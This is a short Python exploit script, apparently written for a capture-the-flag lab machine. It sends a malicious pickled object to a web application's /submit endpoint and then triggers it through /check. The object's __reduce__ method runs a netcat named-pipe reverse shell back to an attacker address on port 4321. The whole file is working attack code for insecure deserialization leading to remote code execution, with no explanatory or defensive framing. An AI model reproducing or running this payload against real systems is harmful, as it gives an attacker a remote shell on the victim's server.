#!/usr/bin/python
# coding: utf-8

import pickle
import sys
import os
import requests
import signal
import time
import hashlib

def def_handler(sig, frame):
	print("\n\n[+]Saindo...\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variable_Globals
submit_url = "http://10.10.10.70/submit"
check_url = "http://10.10.10.70/check"

class Exploit(object):
	def __reduce__(self):
		return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 4321 >/tmp/f; Homer',))

def makeRequest():

	character = pickle.dumps(Exploit())
	quote = "testing"

	post_data = {
		'character': character,
		'quote': quote
	}

	r = requests.post(submit_url, data=post_data)

	# MD5_ID
	md5_id =  hashlib.md5(character+quote).hexdigest()

	post_data = {
		'id': md5_id
	}

	r = requests.post(check_url, data=post_data)

if __name__ == '__main__':
	
	makeRequest()
